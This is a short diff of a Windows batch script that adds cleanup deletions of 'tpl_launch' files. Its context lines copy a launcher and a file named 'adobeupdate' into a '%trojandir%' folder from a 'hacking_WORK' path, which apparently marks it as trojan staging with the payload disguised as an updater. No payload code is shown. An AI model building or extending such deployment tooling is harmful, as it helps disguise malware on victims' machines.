@@ -7,6 +7,8 @@ del /f /q debug_test_*
 del /f /q *.log
 del /f /q adobeupdate
 del /f /q *_running
+del /f /q tpl_launch_*
+del /f /q tpl_launch.cmd_wmic_process_*
 
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
